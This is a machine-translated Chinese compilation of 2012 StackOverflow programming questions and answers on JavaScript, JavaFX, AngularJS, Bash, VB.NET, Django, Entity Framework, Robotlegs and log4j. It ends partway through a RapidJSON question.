> 赞同：0
> 
> 时间：2012-12-12T14:09:55.133
> 
> 标签：javascript, vbscript

```
 nHighlightedRow = Mid(string, 2, 11) 
```

我可以像这样转换，

```
 var nHighlightedRow = string.subStr(2-1,11) 
```

但我必须转换它，

```
 nHighlightedRow = Mid(string, 11) 
```

我可以按如下方式转换吗？

```
 var nHighlightedRow = string.subStr(0,11) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:13:38.497

不。

会的`string.substring(11-1)`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:14:43.343

不，`Mid(string,11)`从字符 11 提取到字符串末尾并`string.substring(0,11)`从字符 1 提取，您需要`string.substring(10)`

# java - 拨打固定电话并捕获击键

> ID：13841632
> 
> 赞同：1
> 
> 时间：2012-12-12T14:10:49.713
> 
> 标签：java, call, sip

我正在寻找一种制作程序的方法，该程序可以调用指定的号码并播放声音信息。被叫者将被要求按下他手机上的一个按钮，然后程序必须能够捕捉到哪个按钮被按下。

我目前有一个可用的解决方案，使用 Voicent，但我发现它不稳定，我希望对过程进行更多控制，更不用说集成在 java 中的解决方案了。

用于呼叫的协议必须是 SIP。

我环顾四周寻找 java 解决方案，并在其他 mjsip 中找到了它，它看起来很有希望，但我看不到捕获击键的可能性。

所以问题是，是否存在任何解决方案（最好是在 java 中实现的东西），我可以在其中捕获按下的击键？

此外，如果可能的话，我希望能够延迟播放声音文件，直到被叫方对着电话讲话。

# javascript - 使用 iFrame 自动下载

> ID：13841633
> 
> 赞同：0
> 
> 时间：2012-12-12T14:10:53.787
> 
> 标签：javascript, html, iframe

我正在提供一个文件供用户在我的网站上下载。我想要实现的是自动下载功能，这样每当用户访问下载页面时，下载对话框应该会自动出现，如果他们点击***运行***文件应该被执行。我使用的逻辑是这样的 -

```
<iframe src='download_link' height='1' width='1' style='display:none;'> 
```

我将此行放在*html*代码的末尾，并且工作正常，除非某些系统具有防病毒功能，例如**Norton Internet Security**。

我想知道它是否有可能克服这个问题，或者有没有其他安全的方法可以为用户提供相同的功能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:17:12.857

要使此类下载成为可能，您可以使用以下内容：

```
<meta http-equiv="refresh" content="0;URL='download_link'"> 
```

作为元标记，这应该放在您的文件中。但是，您可以在加载后创建一个 js 函数来编辑位置。

```
location.href = 'download_link'; 
```

这样，浏览器将加载文件并下载它，但会保留旧文档。如果文件可以在浏览器中打开（例如 pdf 文档），您需要通过 Javascript 在其他选项卡中打开它。

# java - JavaFX UI 冻结问题

> ID：13841634
> 
> 赞同：5
> 
> 时间：2012-12-12T14:10:56.490
> 
> 标签：java, multithreading, concurrency, javafx-2

我试图显示每个任务的进度和状态。每个任务由一行表示`TableView`。每个任务在每个`Thread`. 请参考图片`TableView`。

![在此处输入图像描述](../Images/a3666c443157c778696f1bf3ee02aa1d.png)

对于“Progress” `TableColumn`，我已将 Cell Factory 设置为渲染“ProgressBar”。

```
 public static class ProgressBarTableCell<S, T> extends TableCell<S, T> {

        private final ProgressBar progressBar;
        private ObservableValue<T> ov;

        public ProgressBarTableCell() {
            this.progressBar = new ProgressBar();
            progressBar.setPrefHeight(23);
            setAlignment(Pos.CENTER);
        }

        @Override
        public void updateItem(T item, boolean empty) {
            super.updateItem(item, empty);
            if (item == null) {
                setGraphic(null);
                setText(null);
            } else {
                if (item.toString().equalsIgnoreCase("Processing")) {
                    Platform.runLater(new Runnable() {
                        @Override
                        public void run() {

                            if (getGraphic() == null) {
                                setGraphic(progressBar);
                                progressBar.setProgress(-1);
                            } else {
                                ProgressBar objpProgressBar = (ProgressBar) getGraphic();
                                objpProgressBar.setProgress(-1);
                            }
                            setContentDisplay(ContentDisplay.GRAPHIC_ONLY);
                        }
                    });
                } else {
                    Platform.runLater(new Runnable() {
                        @Override
                        public void run() {
                            if (getGraphic() == null) {
                                setGraphic(progressBar);
                                progressBar.setProgress(0);
                            } else {
                                ProgressBar objpProgressBar = (ProgressBar) getGraphic();
                                objpProgressBar.setProgress(0);
                            }
                            setContentDisplay(ContentDisplay.GRAPHIC_ONLY);
                        }
                    });
                }
            }
        }
    } 
```

没有显示任务的`TableView`更新状态和进度，所以我在后台定期运行一个线程，当我调用 startUpdatingTableProgress() 时它会修改并`TableView`在我调用**stopUpdatingTableProgress** **()**时停止。

 **```
 public void stopUpdatingTableProgress() {
    keepUpdating = false;
}

public void startUpdatingTableProgress() {
    keepUpdating = true;
    TableProgressBarUpdator tpu = new TableProgressBarUpdator(table);
    tpu.start();
}

class TableProgressBarUpdator implements Runnable {

    TableView table;

    public TableProgressBarUpdator(TableView fxtable) {
        table = fxtable;

    }

    public void start() {
        new Thread(this).start();
    }

    public void run() {

        while (keepUpdating) {
            try {
                updateProgressbar();
                Thread.sleep(1000);
            } catch (Exception e) {
                LogHandler.doErrorLogging("Error while updating tables cell", e);
            }
        }
        LogHandler.doDebugLogging("Table process repainting is completed.");
    }

    private void updateProgressbar() throws Exception {
        Platform.runLater(new Runnable() {
            @Override
            public void run() {
                ((TableColumn) table.getColumns().get(0)).setVisible(false);
                ((TableColumn) table.getColumns().get(0)).setVisible(true);
            }
        });

    }
} 
```

但是现在我`JavaFX`的应用程序的用户界面在连续几次后冻结。有没有其他方法可以在后台线程中调用**updateProgressbar()**在特定时间间隔后自动触发并且不会冻结我`JavaFX`的应用程序的 UI？

**我不知道我是否以正确的方式更新每个任务在单独线程中运行的任务状态。如果我想在的帮助下实现这一点，`javafx.concurrent package`任何人都可以向我展示一些指导或流程吗？什么将进入任务，什么将进入服务类？我如何安排它更新进度条？仅供参考：一次只允许 5 个线程并行执行。**

已编辑 -

根据安迪先生的建议，直到我更新了我的代码但仍然没有运气 -

```
TableColumn tableColumn_Progress = new TableColumn("Progress");
        tableColumn_Progress.setCellValueFactory(new PropertyValueFactory<QueueData, Double>("progressBar"));
        tableColumn_Progress.setPrefWidth(100);

        Callback<TableColumn<QueueData, Double>, TableCell<QueueData, Double>> attachmentCellFactory = //
                new Callback<TableColumn<QueueData, Double>, TableCell<QueueData, Double>>() {
            @Override
            public TableCell call(final TableColumn param) {
                final ProgressBarTableCell cell = new ProgressBarTableCell() {
                    @Override
                    public void updateItem(Object item, boolean empty) {
                        super.updateItem(item, empty);
                    }
                };
                return cell;
            }
        };
        tableColumn_Progress.setCellFactory(attachmentCellFactory); 
```

在 QueueData 类中 -

```
DoubleProperty progressBar = null;

public DoubleProperty progressBarProperty() {
        return progressBar;
    }

    public Double getprogressBar() {
        return progressBar.get();
    }

    public void setprogressBar(Double sType) {
        this.progressBar = new SimpleDoubleProperty(sType);
    } 
```

并且没有调用任何后台线程来更新 UI，但没有运气。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T21:51:35.623

据我了解您的代码，您正在翻转可见性以触发表格单元格上的 updateItem 方法？这意味着任何数量的线程都可能试图每秒更改可见性并无休止地重新绘制。

我知道您的实现已经很远了，但是 JavaFX 服务类已经实现了一个进度功能，您可以对其进行更新，这比您现在的操作要简单得多。

拥有一个从线程更新的进度双重属性并将其绑定到 ProgressBar.progressProperty() 这样一切都会自动更新，这将更加简单和高效。这就是 Service 类的工作方式，但您自己很容易实现。

还要确保你正在处理你的线程，这很容易检查。在 Eclipse 中进行调试，在调试透视图中，它将向您显示线程列表，确保它不会无休止地增长。

对于调度 Runnable 签出 ScheduledExecutor 类，您可以使用 Executors.newScheduledThreadPool(numOfThreads) 轻松创建它。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-14T07:27:43.597

您的“QueueData”类应该具有设置现有进度的双重属性的方法，似乎您每次在 setprogressBar(Double sType) 方法中设置进度状态时都在创建新的 SimpleDoubleProperty。

将此更新为 -

```
 public void setprogressBar(Double sType) {
        this.progressBar.set(sType);
    } 
```

只需在开始时创建一次progressBar 对象，然后更新现有对象。**

# eclipse - eclipse搜索包括jar文件在内的资源

> ID：13841635
> 
> 赞同：4
> 
> 时间：2012-12-12T14:11:00.747
> 
> 标签：eclipse

我正在尝试在项目中搜索资源“temp.xml”。该资源位于项目的库文件之一中。

我可以手动找到它，但是当我尝试使用 ctrl+shift+RI 时无法做到。

任何人都可以建议，如何在包括库在内的项目中搜索资源。

我正在使用 Indigo SR1。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:16:39.740

尝试输入：

```
Ctrl + h 
```

选择选项卡**文件搜索**并输入文件名：很好的搜索！

# jquery - Jquery 图像预览 ie6 及更新版本

> ID：13841638
> 
> 赞同：-1
> 
> 时间：2012-12-12T14:11:07.130
> 
> 标签：jquery

我正在使用 jquery 1.8.3，并且正在尝试进行跨浏览器图像预览。这必须支持 IE6 及更高版本、Firefox 和 Chrome。尤其是 IE 很重要，这就是我所有心痛的开始。

我正在使用的html如下：

```
<div>
    <div id="preview">
    </div>
    <div>
        <input type="file" name="companypicture" id="companypicture" />
        <a href="" class="overviewdelete">Delete</a>
    </div>
</div> 
```

我试图开始工作的jquery：

```
$('#companypicture').on('change', function () {

        var file = $('#companypicture').val();
        var image = $('<img>').attr('src', file);
        $('#preview').html(image);
    }); 
```

我也试过：

```
$('#companypicture').on('change', function () {

        var file = $('#companypicture').val();
        var html = '<img src="' + file + '" alt="" />';
        $('#preview').html(html);
    }); 
```

所有这一切都是给我一个断开的链接。我得到图像的替代文本，因为链接不正确。

我也试过 FileReader。FileReader 适用于 IE10，但不适用于 6-7-8-9。由于它必须在 IE6 及更高版本上运行，因此没有解决方案。

由于我一直试图在谷歌上找到答案，我似乎无法在那里找到任何答案。我希望这里有人可以帮助我。

编辑：目前的建议是我将文件上传到我的服务器，然后使用那里的链接显示图像，最后再次删除链接。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T16:50:54.733

您无法在任何浏览器中获取文件上传的完整本地路径。它是浏览器内置的安全功能。您可以将该图像临时保存在某处，并在用户单击保存后删除。使用 jQuery ajax() 保存图像，之后您将轻松获得图像路径:)

# javascript - JQGrid 显示多个 Select

> ID：13841646
> 
> 赞同：0
> 
> 时间：2012-12-12T14:11:25.520
> 
> 标签：javascript, jquery-ui, jqgrid

非工作版本

![在此处输入图像描述](../Images/25f8042477a1b20991ab3d6ff45afe75.png)

```
be = "<a href='#'>Select</a >";
be = "<a href='#' onclick='GetEnrollmentByCIP(\"" + (rowId['CIP']) + "\")'>Select</a >";
jQuery("#grdProgramsEnrolled").jqGrid('setRowData', ids[i], { ab: be }); 
```

这是`be`加载网格时最后一行的内容：

```
<a href='#' onclick='GetEnrollmentByCIP("52.0299")'>Select</a > 
```

为什么我从上面的代码中得到 (2) Select 语句？

此代码仅在不同屏幕上生成单个“选择”

```
be = "<a href='#'>Student</a >";
be = "<a href='#' onclick='GetStudent(\"" + (rowId['UIC']) + "\")'>Student</a >";
jQuery("#grdStudentGrid").jqGrid('setRowData', ids[i], { ab: be }); 
```

这是`be`加载网格时最后一行的内容：

```
 <a href='#' onclick='GetStudent("7910132816")'>Student</a > 
```

我能说的唯一区别是传递的字符串值包含小数点？是否

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T11:10:36.007

据我了解，您想根据所选的行数据调用一个函数。您可以使用 jqgrid 的自定义格式化程序来做同样的事情，而不是在那里塞满 onclick。

```
function myformatter ( cellvalue, options, rowObject ){
var obj = rowObject['CIP']
return '<a href ="#" onclick="GetEnrollmentByCIP(' + obj+ ')">Select</a>';
} 
```

详情:: [http://www.trirand.com/jqgridwiki/doku.php?id=wiki:custom_formatter](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:custom_formatter)

# angularjs - AngularJS：基于具有指令名称的数组插入指令

> ID：13841647
> 
> 赞同：1
> 
> 时间：2012-12-12T14:11:25.737
> 
> 标签：angularjs, directive

假设我有三个（元素）指令：`<x/> <y/> and <z/>`.

```
module.directive('x', function() {
    return {
        restrict: 'E',
        template: '<div class="x">{{identifier}}</div>'
    }
}); 
```

的指令`<y/> and </z>`是相似的。

我还有一组页面配置对象。每个对象都有一个类型和一个标识符。类型表示指令，标识符是要在指令模板内显示的一些数据，在上面的指令片段中显示为 {{identifier}}。

```
var pageElements = [
{type: 'x',identifier:'123'},
{type: 'z',identifier:'adf'},
{type: 'x',identifier:'qwe'}, 
{type: 'y',identifier:'4ed'},
{type: 'y',identifier:'576'}
] 
```

在我的页面中，我想要这样的东西：

```
<div id="containingDiv" ng-repeat="elem in pageElements"></div> 
```

如何设置我的指令等，以便生成以下输出，并在 pageElements 数组更改时更新？

```
<div id="containingDiv">
    <div class="x">123</div>
    <div class="z">adf</div>
    <div class="x">qwe</div>
    <div class="y">4ed</div>
    <div class="y">576</div>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T01:41:12.150

在您的控制器中，您将执行以下操作：

```
function myController($scope){
    $scope.pageElements = [
        {type: 'x',identifier:'123'},
        {type: 'z',identifier:'adf'},
        {type: 'x',identifier:'qwe'}, 
        {type: 'y',identifier:'4ed'},
        {type: 'y',identifier:'576'}
    ];
} 
```

然后在您的 html 中，正如 bmleite 建议的那样，您将拥有：

```
<div id="containgDiv">
    <div class="{{elem.type}}" ng-repeat="elem in pageElements">{{elem.identifier}}</div>
</div> 
```

这会产生

```
<div id="containingDiv">
    <div class="x">123</div>
    <div class="z">adf</div>
    <div class="x">qwe</div>
    <div class="y">4ed</div>
    <div class="y">576</div>
</div> 
```

在您的 angular.module(.... 中，您可以将指令连接到类。每次更新 pageElements 数组时，列表将通过添加新的、编辑当前的或删除的来更改不再存在了。Angular 会为您处理那些繁重的工作。

# c# - 在 Visual Studio 中从另一个 Web 项目页面创建指向 Web 项目页面的链接

> ID：13841649
> 
> 赞同：1
> 
> 时间：2012-12-12T14:11:37.027
> 
> 标签：c#, .net

如何使用 c# 在 .Net 中的项目网页上设置链接以指向同一 Visual Studio 解决方案中的另一个项目网页？

# bash - Bash 中“if eq”语句的问题

> ID：13841651
> 
> 赞同：1
> 
> 时间：2012-12-12T14:11:41.330
> 
> 标签：bash, if-statement, compare

我编写了一个简短的脚本，它从远程主机上的 /etc/sudoers (## Expires 12122012) 中提取一行，然后将其与今天的日期进行比较，使用`date +%d%m%Y`. 即使显示分配给它们的变量时这两个值看起来相同，但 if 语句永远不会将它们显示为匹配项。脚本和输出如下。额外的 echo 语句用于验证实际匹配的变量。

```
#!/bin/bash
TODAY=`date +%d%m%Y`
EXPIRES=`ssh -t hostname "grep Expires /etc/sudoers"`
EXPIREDATE=`echo $EXPIRES | awk -F " " '{ printf $3 }'`

if [ $TODAY = $EXPIREDATE ]
    then
            echo "This matches"
            exit
    else
            echo "this doesn't match"
            echo "$TODAY"
            echo "$EXPIREDATE"
            exit
fi
exit 
```

输出：sh 测试

```
this doesn't match
12122012
12122012 
```

我已经尝试了比较的多种变体，但没有运气。任何想法表示赞赏。谢谢！

**更新**
应用评论中的一些建议来检查空格后，我可以通过 echo 语句看到更多信息。不太清楚这是怎么发生的 0_o

```
#>echo test${TODAY}more
   test12122012more
#>echo test${EXPIREDATE}more
   more12122012 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T15:07:02.087

您的远程文件正在使用 CRLF 换行符。您需要传递您的文本`tr`才能删除 CR。

```
... | tr -d '\r' 
```

# android - 如何在 android 中像 iPhone Tableview 一样制作 Listview？

> ID：13841655
> 
> 赞同：0
> 
> 时间：2012-12-12T14:12:00.597
> 
> 标签：android, listview

具有空单元格的列表视图，而不在适配器中添加空白对象 (myAdapter.add(""))。我不想要那种解决方案。是否有任何属性或方法可以让我们获得这种类型的功能。

## Iphone 图像表格视图

![带有空单元格的 iphone tableview 图像](../Images/90457ddfb1a7b08bfb5b29477590cb20.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:29:59.880

您可以在基本适配器的 getCount 方法中设置某个值，例如 20。然后在前 4 个项目的 getView 方法中设置这些项目的布局......在其他项目中设置一个空的布局。

# vb.net - 条件满足，但是if语句下的代码没有执行

> ID：13841656
> 
> 赞同：1
> 
> 时间：2012-12-12T14:12:01.243
> 
> 标签：vb.net, vb.net-2010

我正在尝试在 if 语句中检查以下条件。但是，即使满足条件，if 语句下的代码也不会执行。

```
If (Gnum(0, 0) = Rnum(0, 0) & Gnum(0, 1) = Rnum(0, 1) & Gnum(0, 2) = Rnum(0, 2)) Then
    Lbl_Msg.Text = "Send Msg"
End If 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:14:47.873

我不确定 '&' 是否会按预期工作，因为 '&' 用于 vb.net 中的连接

尝试改用“和”。

编辑：vb.net 认为您在这里尝试做的是连接所有这些变量并检查该结果是否等于 true（它不会是）。这就是为什么 if 语句中的代码没有被执行但也没有显示错误的原因。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T14:17:14.787

大概你想做`AND`检查。而不是`&`，尝试使用`AndAlso`

```
If (Gnum(0, 0) = Rnum(0, 0) AndAlso Gnum(0, 1) = Rnum(0, 1) AndAlso Gnum(0, 2) = Rnum(0, 2)) Then
    Lbl_Msg.Text = "Send Msg"
end if 
```

`&`用于连接 VB.NET 中的字符串。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T16:03:11.677

```
If (Gnum(0, 0) = Rnum(0, 0) AND Gnum(0, 1) = Rnum(0, 1) AND Gnum(0, 2) = Rnum(0, 2)) Then
    Lbl_Msg.Text = "Send Msg"
Else
    Lbl_Msg.Text = "see if this text is written to confirm if your if is true"
End If 
```

# django - 使用 get_urls 将视图添加到子类 AdminSite

> ID：13841663
> 
> 赞同：2
> 
> 时间：2012-12-12T14:12:37.220
> 
> 标签：django, views, admin

我对 AdminSite 进行了子类化，并且正在尝试添加几个自定义视图。

当我将它们添加到我的一个应用程序的 url 中时，我的视图工作正常，但我无法让它们与管理员一起使用（在我的新管理站点注册的所有模型都可以正常工作）。

```
class HqAdmin(AdminSite):
    def get_urls(self):
        urls = super(HqAdmin, self).get_urls()
        urls += patterns('',
            url(r'^orders/$',
                self.admin_view(OrderListView.as_view()),
                kwargs={'current_app': self.name},
                name="order-list-page"),
            url(r'^orders/(?P<pk>\d+)/$',
                self.admin_view(OrderView.as_view()),
                kwargs={'current_app': self.name},
                name='order-page'),
        )
        return urls

hq_admin = HqAdmin(name='Custom Admin') 
```

我在 /admin/orders/ 收到 404

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:31:40.233

您是否`hq_admin`在 url conf 中包含了 url？

```
# urls.py
from myproject.admin import hq_admin

urlpatterns = patterns('',
   (r'^admin/', include(hq_admin.urls)), 
```

# drop-down-menu - Bootstrap 折叠“显示”事件第一次无法正常工作

> ID：13841668
> 
> 赞同：2
> 
> 时间：2012-12-12T14:13:05.563
> 
> 标签：drop-down-menu, twitter-bootstrap, collapse

Bootstrap Responsive 的折叠 btn 的“显示”事件第一次未正确触发，也未将高度设置为“自动”。它在第一次扩展后每次都有效，但不是第一次。

```
<div class="navbar navbar-inverse navbar-fixed-top">
  <div class="navbar-inner">
    <div class="container">
      <a id="collapse-btn" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </a>
      <a class="brand" href="#">&nbsp;</a>
      <div class="nav-collapse">
        <ul class="nav pull-right" id="user-dropdown">
          <li>
            <form class="navbar-search" action="">
              <input type="text" class="search-query span3" placeholder="Search">
            </form>
          </li>
          <li class=""><a href="#"><i class="icon-list icon-white"></i> Categories</a></li>
          <li class=""><a href="#"><i class="icon-upload icon-white"></i> Upload</a></li>
          <li class="dropdown" id="dropdown-click-user">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="icon-user icon-white"></i> Username <b class="caret"></b></a>
            <ul class="dropdown-menu" id="dropdown-menu-user">
              <li><a href="#">Action</a></li>
              <li><a href="#">Another action</a></li>
            </ul>
          </li>
        </ul>
      </div><!-- /.nav-collapse -->
    </div><!-- /.container -->
  </div><!-- /.navbar-inner -->
</div><!-- /.navbar --> 
```

请参阅[http://jsfiddle.net/PKDmn/](http://jsfiddle.net/PKDmn/)

检查步骤：

1.  确保屏幕宽度足够小，可以看到折叠图标。
2.  单击折叠图标（右上角）
3.  点击用户名下拉菜单（第一次不会展开）
4.  关闭折叠菜单（右上角）
5.  打开折叠菜单（右上角）
6.  单击用户名下拉列表（应该从这里开始工作）

我需要它第一次和所有其他人一样工作。想法？

谢谢，蒂姆

# iphone - 为什么标签文本不总是从同一点开始？

> ID：13841671
> 
> 赞同：3
> 
> 时间：2012-12-12T14:13:09.703
> 
> 标签：iphone, objective-c, ios, xcode, uilabel

我有一个`UILabel`有 4 行的。它的字体大小为 15`autoshrink`并且已启用。它的最小字体大小为 10。

当我的文本太长时，它会自动从第一行开始。但是当我的文本太小时，它会从**`middle line`**.

如何确保文本始终从第一行开始，无论是太长还是太短？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:35:46.460

我认为您正在寻找的`UITextView`不仅仅是 a `UILabel`。

来自 Apple 的文档：

> UITextView 显示一个可以包含多行可编辑文本的区域。

可*编辑*部分是可选的。您可以禁用它，如果您想靠近`UILabel`.

# .net - 使用实体框架进行分页时的性能问题

> ID：13841678
> 
> 赞同：0
> 
> 时间：2012-12-12T14:13:21.617
> 
> 标签：.net, entity-framework

我使用 Entity Framework 使用`.skip`and实现了分页`.take`。这很好用，但是当我在数据库中获取 100 万条记录的记录数时（UIClient 需要对网格页码进行计数），它需要花费大量时间，大约 600 毫秒，这是巨大的。

如果我不使用计数，只实现分页，那么它几乎不需要 20 到 25 毫秒。如何进行有效计数？我怎样才能从 600 毫秒降低到 50 毫秒左右？

我使用的示例查询：

```
int count = (from c in dbcontext.Customer
             where c.customerName ='xyz' && c.date >= 'dateTime'
             select c.CustomerId).Count(); 
```

我有索引`Name`，`dateTime`并且`CustomerId`是主键。

提前致谢，

阿比奈

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:44:57.317

您可以使用 SQL Server Profiler 获取从实体框架生成的查询，并通过 SQL Server Management Studio 中的查询分析器运行它吗？

从那里您可以查看执行计划并查看瓶颈发生在哪里，并调整您的代码以更好地执行。

我认为有了这些信息，问题会变得更加明显。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:59:01.390

尝试在分页之前对您已经使用的记录使用计数，看看性能是否更好：

```
var records = (from c in dbcontext.Customer where c.customerName ='xyz' && c.date >= 'dateTime' select c.CustomerId);

var total = records.Count;
var pagedRecors = records.Skip((currentPage - 1) * recordsPerPage).Take(recordsPerPage).ToList(); 
```

# unit-testing - Robotlegs 2 中的单元测试中介和视图

> ID：13841679
> 
> 赞同：1
> 
> 时间：2012-12-12T14:13:27.187
> 
> 标签：unit-testing, mocking, mediator, robotlegs, flexunit4

我正在学习robotlegs框架，但是这个问题也是我想到的一般性。

我有一个 Mediator 类，它侦听 View 中按钮上的事件，并在该事件上调度一个包含 VO 的信号，该信号包含 View 中两个 TextField 对象的属性。

下面是中介类。

button 是一个私有变量，在 View 中只有 getter 而没有 setter。

我的问题是，我将如何对这门课进行单元测试？1\. 检查事件是否发生，Signal 正在被分派... 2\. 当信号被分派时，它是否包含正确的 VO

我知道我需要使用 Mock，并且我正在使用 mockolate，但我正在转圈，因为我不知道如何从视图类的按钮中模拟已调度的事件？

感谢帮助

```
 public class LoginFormMediator extends Mediator {

            //---------------------------------------------------------------
            //  Public variables
            //---------------------------------------------------------------

            [Inject]
            public var view:LoginFormView;
            [Inject]
            public var authorizationSignal:AuthorizationSignal;

            //---------------------------------------------------------------
            //  Public Functions
            //---------------------------------------------------------------

            override public function initialize():void
            {
                view.button.addEventListener(MouseEvent.CLICK,onLogin,false,0,true);

            }

            //---------------------------------------------------------------
            //  Private methods
            //---------------------------------------------------------------
            private function onLogin(event:MouseEvent):void {
                var userInfo:UserInfo = new UserInfo(view.usernameField.text,view.passwordField.text);
                authorizationSignal.dispatch(userInfo);

            }

        }
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T16:52:27.513

有几种可能：

1/不要暴露按钮，让中介直接听。视图应该调度一个特定的、具体的事件，调解器正在侦听，最好这描述用户意图，而不是用户操作。例如：让视图调度 LoginFormViewEvent.LOGIN_REQUESTED 或 LoginFormViewEvent.CREDENTIALS_PROVIDED 事件。这样做更好的原因是它不会将您的调解器与您的视图的特定实现联系起来。例如，也许稍后您想添加某种需要在发送凭据之前运行的验证规则。如果您直接收听按钮，您要么将验证逻辑写入中介，这是绝对不行的，要么您需要重构您的视图。

调解员的工作是在视图和系统之间进行调解，仅此而已。它不需要知道视图中有哪些 UI 元素，只需将数据从视图传递到系统，反之亦然。

2/ 另一种可能性是让中介将系统范围的信号传递给视图，该视图执行调度和 VO 填充。

```
//mediator
[Inject]
public var view:LoginFormView;
[Inject]
public var authorizationSignal:AuthorizationSignal;

override public function initialize():void{
    view.authorizationSignal = authorizationSignal;
}

//view
public var authorizationSignal : ISignal;

public function init():void{
    button.addEventlistener( MouseEvent.CLICK, button_clickHandler );
}

private function button_clickHandler( event : MouseEvent ) : void{
    var vo : UserInfo = new UserInfo( usernameField.text, passwordField.text);
    authorizationSignal.dispatch( vo );
} 
```

我倾向于使信号有条件地实例化和通用，以使视图更容易重用。像这样：

```
//view
private var _authorizationSignal : ISignal;
public function set authorizationSignal( value : ISignal ) : void{
    _authorizationSignal = value;
}
public function get authorizationSignal() : ISignal{
    return _authorizationSignal ||= new Signal();
} 
```

然后信号注入是可选的，视图提供了一个默认的信号实例。

3/ 或者，如果您选择坚持原来的方法，您可以以正常的模拟方式模拟按钮。让您的视图实现一个接口，其中声明了按钮的 getter。将您的调解器映射到界面（无论如何这是一个好习惯）而不是具体的视图类型。这样，您可以在测试类中为其分配一个模拟按钮，但将按钮封装为面向中介。

然后，让模拟按钮调度事件：

```
[Mock]
public var mockButton : Button;

//in setup 
view.button = mockButton

//in test
mockButton.dispatch( new MouseEvent( MouseEvent.CLICK ) ); 
```

# java - 将记录器与 Spring Template MVC 项目集成

> ID：13841681
> 
> 赞同：0
> 
> 时间：2012-12-12T14:13:30.773
> 
> 标签：java, spring, spring-mvc, log4j

我阅读了很多帖子并尝试了很多方法，但仍然无法记录我的代码流。原因可能是我因各种意见而感到困惑。

我的 WebContent/conf/log4j.properties

```
# Direct log messages to a log file
log4j.appender.rollingFile=org.apache.log4j.RollingFileAppender
log4j.appender.rollingFile.File=D:/mylog.log
log4j.appender.rollingFile.MaxFileSize=2MB
log4j.appender.rollingFile.MaxBackupIndex=2
log4j.appender.rollingFile.Threshold=debug
log4j.appender.rollingFile.layout = org.apache.log4j.PatternLayout
log4j.appender.rollingFile.layout.ConversionPattern=%p %t %c - %m%n
log4j.rootLogger = INFO, rollingFile 
```

我的 /WEB-INF/web.xml

```
 <?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" id="WebApp_ID" version="2.5">
  <display-name>SpringSort</display-name>
  <welcome-file-list>
    <welcome-file>index.html</welcome-file>
    <welcome-file>index.htm</welcome-file>
    <welcome-file>index.jsp</welcome-file>
    <welcome-file>default.html</welcome-file>
    <welcome-file>default.htm</welcome-file>
    <welcome-file>default.jsp</welcome-file>

  </welcome-file-list>

  <servlet>
        <servlet-name>sort</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <load-on-startup>1</load-on-startup>
    </servlet>
    <servlet-mapping>
        <servlet-name>sort</servlet-name>
        <url-pattern>*.html</url-pattern>
    </servlet-mapping>

</web-app> 
```

我的控制器 Controller.java 的一部分

```
private static final Logger logger = LoggerFactory.getLogger(Controller.class);
System.out.println(logger);
System.out.println(logger.isDebugEnabled());
logger.info("Logger Initiliazed"); 
```

`System.out.println(logger);`给出参考地址并且
`System.out.println(logger.isDebugEnabled());`给出真实的。但是没有创建日志文件。

谁能帮我解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T15:05:27.380

本教程中提到的依赖项适用于 Maven（因此，如果您不使用 maven，请确保您的构建路径中有 log4j jar）。

另一个简单的[教程](http://veerasundar.com/blog/2009/07/log4j-tutorial-adding-log4j-logging-to-your-project/)，将 log4j 添加到您的项目，然后介绍如何[配置它](http://veerasundar.com/blog/2009/07/log4j-tutorial-how-to-send-the-log-messages-to-a-file/)。

# java - Java Web Start / 可拖动小程序

> ID：13841686
> 
> 赞同：2
> 
> 时间：2012-12-12T14:13:51.867
> 
> 标签：java, applet, draggable, java-web-start

我试图让一个小程序在浏览器关闭后持续存在，以便在退出之前完成一个过程。

如果我给小程序“可拖动”属性，然后将它拖到浏览器页面之外，小程序仍然可以通过 JavaScript 的 LiveConnect 使用，并且在浏览器关闭后它会继续。

但我想要一种方法来实现这一点，而用户不必每次都将小程序拖到浏览器之外。

直接使用 JWS 启动小程序不会让我通过我的应用程序所必需的 javascript 与它进行通信。

有人知道实现这一目标的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-10T01:30:28.067

如何从小程序中弹出你的窗口，并使用 javascript 监控浏览器关闭事件，并在小程序未准备好时返回 false？

# c++ - Rapidjson 位翻转

> ID：13841688
> 
> 赞同：0
> 
> 时间：2012-12-12T14:13:55.880
> 
> 标签：c++

我有以下代码将数据添加到 rapidjson::Document，声明如下：

```
rapidjson::Document rest;
rest.SetObject(); 
```

在一个循环中。

```
Value v(value.c_str());
stringstream ss;//create a stringstream
